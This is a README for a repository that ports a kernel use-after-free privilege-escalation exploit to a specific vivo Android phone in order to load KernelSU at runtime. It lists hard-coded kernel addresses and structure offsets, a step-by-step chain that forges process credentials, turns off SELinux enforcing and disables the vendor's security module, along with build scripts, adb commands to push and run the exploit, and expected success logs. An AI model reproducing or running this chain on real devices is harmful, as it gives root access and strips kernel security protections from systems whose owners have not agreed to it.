# V2505A CVE-2026-98260 Temporary Privilege Escalation Port

## Status

This port has previously completed temporary privilege escalation verification on the target device:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
kernelsu              221184  1
SELinux=Enforcing
```

`vendor_boot` is never modified or flashed, and both the temporary root and this
session's kernel changes disappear after a reboot. The repository keeps only the
source code, build scripts, and the runtime assets required by the App; it does not
commit verification logs, APKs, OTA extracts, or local dependency caches.

## App Integration

V2505A is merged into the App as a third independent entry and does not reuse the 6.18 / 6.12.69 constants:

- `ExploitKind.CVE2505A` is selected automatically only when the vendor is `vivo` and the full kernel release
  equals `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`.
- The App packages only the jniLibs `libk61223.so / libk61258.so`: a single Rust entry (the same
  `exploit/rust-kplant` crate built with `--features k61223`, with `build.rs`
  appending `-DV2505A`), embedding the C plant and executing it in place from `nativeLibraryDir`;
  `v2505a_run.sh` / standalone plant assets are no longer deployed to `/data/local/tmp`.
- `libk61223.so / libk61258.so` use their own `ALREADY_LOADED` and failure-retry semantics; a failed
  plant turns into a holder that preserves the on-device state, the holder is skipped, and a retry
  is possible in the same boot.
- The V2505A entry hides the inapplicable anti-root, uninstall protection, and VFS switches, keeping only SUSFS;
  the SUSFS ko is loaded in place from `libsusfs_guard_lkm_612.so` in `nativeLibraryDir`.

App build verification:

```text
:app:assembleDebug
BUILD SUCCESSFUL
```

The APK is a local build artifact and is not version-controlled. V2505A is built into the single entry
`libk61223.so / libk61258.so` (`exploit/rust-kplant --features k61223`);
after the App is launched on a current V2505A device, the info card automatically shows
`CVE-2026-98260-vivo-V2505A`.

## Target Device

- Model: `vivo V2505A / PD2505`
- Android: 16 / SDK 36
- Build: `PD2505B_A_16.0.24.7.W10`
- Kernel: `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
- Bootloader: `locked`, `verifiedbootstate=green`
- Current ADB: `10AG1S2Y6D005Z0`

## Exploit Chain

1. Obtain the zero-write and fake-cred write primitives through the POSIX CPU timer UAF of `CVE-2026-98260`.
2. Point the target task's `cred` at a controlled fake cred.
3. Disable SELinux enforcing.
4. Zero the fake cred's `uid`.
5. Zero `__tracepoint_sys_exit->funcs` so the `sys_exit` probe of vivo `vr.ko` loses its registration.
6. Wake the root child process and perform the KernelSU late-load.
7. Verify with `su -c id`.

`vr.ko` is handled with the community W1c method; see
`reference/README.md` for the reference sources and the BTF validation.

## Recovered Constants

The kernel symbols and BTF come from the OTA's `boot.img`. The OTA, the unpacked files, and the
recovered ELF are all local analysis inputs and are not version-controlled.

```c
#define STATIC_TIMER_SITE         0xffffffc0801e0890ULL
#define TIMER_SITE_LOW21          0x1e0890ULL

#define SELINUX_STATE_STATIC      0xffffffc082679370ULL
#define PANIC_ON_WARN_STATIC      0xffffffc0823eafe0ULL
#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc082594840ULL
#define TRACEPOINT_FUNCS_OFF      0x48ULL

#define ROOT_USER_STATIC          0xffffffc082411ae0ULL
#define INIT_USER_NS_STATIC       0xffffffc082411868ULL
#define INIT_UCOUNTS_STATIC       0xffffffc082413478ULL
#define INIT_GROUPS_STATIC        0xffffffc082412fa8ULL

#define COPY_PROCESS_LOW21        0xcfd98ULL

#define OFF_TASK_CRED             0x900ULL
#define CRED_UID_OFF              0x8ULL
#define CRED_REQ                  0xb8ULL
#define CRED_ALLOC                0xc0ULL
#define TASK_ALLOC_BYTES          0x1440ULL
#define TIMER_ALLOC               0x100ULL
#define FULLCAP                   0x1ffffffffffULL
```

BTF validation:

- `sizeof(struct cred) = 0xb8`
- `task_struct.cred = 0x900`
- `task_security_struct.exec_sid/create_sid = 0x8/0xc`
- `sizeof(struct tracepoint) = 0x50`
- `tracepoint.funcs = 0x48`

## Build

The build sources are the `exploit/src/plant_core.inc` engine plus `K61223_plant.c` / `K61258_plant.c`.

```powershell
$env:ANDROID_NDK_HOME = "C:\path\to\android-ndk-r28c"
.\ports\v2505a\build-v2505a.ps1 -Mode Both
```

Local build artifacts:

- `bin/v2505a_probe`: read-only probe program, built with `PROBE_ONLY` defined
- `bin/v2505a_plant`: full chain, with `fake` as the runtime argument

`bin/` is ignored by `.gitignore`. The App's built-in payload does not use the
standalone plant here directly; instead it builds the Rust single entry as described in the main README:

```bash
cd exploit/rust-kplant
cargo build --release --target aarch64-linux-android \
    --no-default-features --features k61223
cp target/k61223/aarch64-linux-android/release/kplant \
  ../../app/app/src/main/jniLibs/arm64-v8a/libk61223.so
# For 6.12.58 OS6/OS7 use --features k61258, copy the artifact as libk61258.so
```

`bin/v2505a_plant` is used only for port research and manual adb verification.

## Running

Push and set permissions:

```powershell
adb -s 10AG1S2Y6D005Z0 shell "mkdir -p /data/local/tmp/v2505a-port"
adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_probe /data/local/tmp/v2505a-port/v2505a_probe
adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_plant /data/local/tmp/v2505a-port/v2505a_plant
adb -s 10AG1S2Y6D005Z0 shell "chmod 755 /data/local/tmp/v2505a-port/v2505a_probe /data/local/tmp/v2505a-port/v2505a_plant"
```

Run the read-only probe first:

```powershell
adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && ./v2505a_probe probe"
```

Then run the full chain. The `libksud.so` path is resolved dynamically from the currently installed KernelSU package:

```powershell
adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && KSUD=`"`$(pm path me.weishu.kernelsu | sed -n 's/^package://p' | sed 's#/base.apk$##')/lib/arm64/libksud.so`" && env PYB110_KSUD=`"`$KSUD`" PYB110_MANAGER_PKG='me.weishu.kernelsu' PYB110_KMI='android16-6.12' ./v2505a_plant fake"
```

On success the process stays parked and the log shows:

```text
[+] stage vr_sys_exit target=...
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
PLANT_CRED_OK child=...
LATE_LOAD_RC=0
```

Independent verification:

```powershell
adb -s 10AG1S2Y6D005Z0 shell "su -c id"
adb -s 10AG1S2Y6D005Z0 shell "su -c 'lsmod | grep -i kernelsu; getenforce'"
```

## Verification Results

- On a clean boot the probe returns `PROBE_OK` and successfully obtains the KASLR slide and the
  `vr_sys_exit` funcs slot address.
- In one full run all four stage writes land; after the `vr_sys_exit` zero-write the child process is not killed,
  and the KernelSU late-load returns 0.
- Independent `su -c id`, module check, and SELinux check all match expectations.
- The controlled failure path does not write a dirty flag; after the plant turns into a holder it can be retried in the same boot.

## Notes

- UAF writes are probabilistic. After any stage failure, wait for the plant to turn into a holder and retry
  directly in the same boot; do not actively kill or reap the holder.
- Do not flash partitions or modify `vendor_boot`. This approach performs runtime kernel memory writes only.
- After every reboot the KASLR, SELinux, and `vr.ko` state is restored, so the full chain must be run again.
- KernelSU package paths contain random directories; do not hardcode old paths.

## Directory

```text
ports/v2505a/
├── README.md
├── build-v2505a.ps1
├── reference/README.md
└── tools/
    ├── btf_inspect.py
    ├── kernel_analyze.py
    ├── payload_info.py
    ├── unpack_bootimg.py
    └── zstd_unwrap.py
```

The locally generated `bin/`, `artifacts/`, `logs/`, `app/`, `work/`,
`tools/vendor/`, and Python caches are all ignored and not committed to the repository.
